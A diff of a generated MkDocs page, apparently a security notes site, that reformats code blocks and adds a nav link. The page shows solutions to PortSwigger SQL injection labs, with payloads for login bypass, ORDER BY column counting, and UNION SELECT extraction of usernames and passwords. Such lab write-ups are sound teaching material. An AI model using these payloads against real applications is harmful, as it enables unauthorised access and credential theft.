@@ -683,6 +683,8 @@
       
         
       
+        
+      
     
     
     
@@ -765,6 +767,27 @@
   
   <span class="md-ellipsis">
     ADB
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../adidnsdump/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    adidnsdump
   </span>
   
 
@@ -17447,16 +17470,16 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <p>To solve the lab, perform an SQL injection attack that causes the application to display details of all products in any category, both released and unreleased.</p>
 <h3 id="solution">Solution</h3>
 <p>Filter by one of the categories and, in the URL, instead of that categorry, after the "=" add:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>&#39; OR &#39;1&#39;=&#39;1
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a>&#39; OR &#39;1&#39;=&#39;1
+</span></code></pre></div></td></tr></table></div>
 <h2 id="sql-injection-vulnerability-allowing-login-bypass">SQL injection vulnerability allowing login bypass</h2>
 <h3 id="enuntiation_1">Enuntiation</h3>
 <p>This lab contains an <a href="https://portswigger.net/web-security/sql-injection">SQL injection</a> vulnerability in the login function.</p>
 <p>To solve the lab, perform an SQL injection attack that logs in to the application as the <code>administrator</code> user.</p>
 <h3 id="solution_1">Solution</h3>
 <p>In the login page, add to username:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>administrator&#39;--
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a>administrator&#39;--
+</span></code></pre></div></td></tr></table></div>
 <p>In password it doesn't matter what you write.</p>
 <h2 id="sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query">SQL injection UNION attack, determining the number of columns returned by the query</h2>
 <h3 id="enuntiation_2">Enuntiation</h3>
@@ -17464,14 +17487,17 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <p>To solve the lab, determine the number of columns returned by the query by performing an <a href="https://portswigger.net/web-security/sql-injection/union-attacks">SQL injection UNION</a> attack that returns an additional row containing null values.</p>
 <h3 id="solution_2">Solution</h3>
 <p>In the category filter, filter by 'Gift'. Then in the URL, substitute Gift by: </p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>&#39; OR &#39;1&#39;=&#39;1&#39; order by 1-- -
-</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>&#39; OR &#39;1&#39;=&#39;1&#39; order by 2-- -
-</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>&#39; OR &#39;1&#39;=&#39;1&#39; order by 3-- -
-</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>&#39; OR &#39;1&#39;=&#39;1&#39; order by 4-- -
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1">1</a></span>
+<span class="normal"><a href="#__codelineno-2-2">2</a></span>
+<span class="normal"><a href="#__codelineno-2-3">3</a></span>
+<span class="normal"><a href="#__codelineno-2-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a>&#39; OR &#39;1&#39;=&#39;1&#39; order by 1-- -
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2"></a>&#39; OR &#39;1&#39;=&#39;1&#39; order by 2-- -
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3"></a>&#39; OR &#39;1&#39;=&#39;1&#39; order by 3-- -
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4"></a>&#39; OR &#39;1&#39;=&#39;1&#39; order by 4-- -
+</span></code></pre></div></td></tr></table></div>
 <p>When substituting by the last string, you will have an error. Bingo! Our last successful try was with 3 columns, so the table is holding 3 columns. Now we can launch our UNION attack:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>&#39; OR &#39;1&#39;=&#39;1&#39; UNION SELECT all  null,null,null-- -
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a>&#39; OR &#39;1&#39;=&#39;1&#39; UNION SELECT all  null,null,null-- -
+</span></code></pre></div></td></tr></table></div>
 <p><img alt="Scrrenshot" src="../../img/bupsuite-sqli3.png" /></p>
 <h2 id="sql-injection-union-attack-finding-a-column-containing-text">SQL injection UNION attack, finding a column containing text</h2>
 <h3 id="enuntiation_3">Enuntiation</h3>
@@ -17480,12 +17506,13 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <h3 id="solution_3">Solution</h3>
 <p>Select category filter GIFT in the Home lab.</p>
 <p>Substitute in the URL Gift by the following string to guess which column is being displayed: </p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>&#39; UNION SELECT null,null,null-- -
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a>&#39; UNION SELECT null,null,null-- -
+</span></code></pre></div></td></tr></table></div>
 <p>The Lab environment is providing at the top of the screen a string of characters that you will need to get reflected in order to pass the lab. In my case it was the string 'FEvLOw'. I tried that string in different positions and I got success in the second position: </p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>&#39;+UNION+SELECT+&#39;FEvLOw&#39;,NULL,NULL--
-</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>&#39;+UNION+SELECT+NULL,&#39;FEvLOw&#39;,NULL--
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1">1</a></span>
+<span class="normal"><a href="#__codelineno-5-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1"></a>&#39;+UNION+SELECT+&#39;FEvLOw&#39;,NULL,NULL--
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2"></a>&#39;+UNION+SELECT+NULL,&#39;FEvLOw&#39;,NULL--
+</span></code></pre></div></td></tr></table></div>
 <p><img alt="Scrrenshot" src="../../img/bupsuite-sqli4.png" /></p>
 <h2 id="sql-injection-union-attack-retrieving-data-from-other-tables">SQL injection UNION attack, retrieving data from other tables</h2>
 <h3 id="enuntiation_4">Enuntiation</h3>
@@ -17495,8 +17522,8 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <h3 id="solution_4">Solution</h3>
 <p>First, we test the number of columns and we obtain 2.</p>
 <p>Later we run</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>&#39; UNION SELECT ALL username,password FROM users-- -
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1"></a>&#39; UNION SELECT ALL username,password FROM users-- -
+</span></code></pre></div></td></tr></table></div>
 <p><img alt="screenshot" src="../../img/bupsuite-sqli5.png" /></p>
 <h2 id="sql-injection-union-attack-retrieving-multiple-values-in-a-single-column">SQL injection UNION attack, retrieving multiple values in a single column</h2>
 <h3 id="enuntiation_5">Enuntiation</h3>
@@ -17505,19 +17532,21 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <p>To solve the lab, perform an <a href="https://portswigger.net/web-security/sql-injection/union-attacks">SQL injection UNION</a> attack that retrieves all usernames and passwords, and use the information to log in as the <code>administrator</code> user.</p>
 <h3 id="solution_5">Solution</h3>
 <p>Like in the previous lab, first we test how many columns there are:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>&#39; UNION SELECT ALL NULL,NULL-- -
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1"></a>&#39; UNION SELECT ALL NULL,NULL-- -
+</span></code></pre></div></td></tr></table></div>
 <p>After that we check that (in my case) the column that is reflected is the second one, and we use that to retrieve the users and passwords:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>&#39; UNION SELECT NULL,username FROM users-- -
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1"></a>&#39; UNION SELECT NULL,username FROM users-- -
+</span></code></pre></div></td></tr></table></div>
 <p>And we get:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>carlos
-</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>administrator
-</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>wiener
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-9-1">1</a></span>
+<span class="normal"><a href="#__codelineno-9-2">2</a></span>
+<span class="normal"><a href="#__codelineno-9-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1"></a>carlos
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2"></a>administrator
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3"></a>wiener
+</span></code></pre></div></td></tr></table></div>
 <p>And then, passwords:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>&#39; UNION SELECT NULL,password FROM users-- -
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-10-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1"></a>&#39; UNION SELECT NULL,password FROM users-- -
+</span></code></pre></div></td></tr></table></div>
 <p>And we get:</p>
 <p><img alt="screenshot" src="../../img/bupsuite-sqli6.png" /></p>
 <h2 id="sql-injection-attack-querying-the-database-type-and-version-on-oracle">SQL injection attack, querying the database type and version on Oracle</h2>
@@ -17600,7 +17629,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight"], "search": "../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight", "codehilite", "code-blocks"], "search": "../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../../assets/javascripts/bundle.88dd0f4e.min.js"></script>
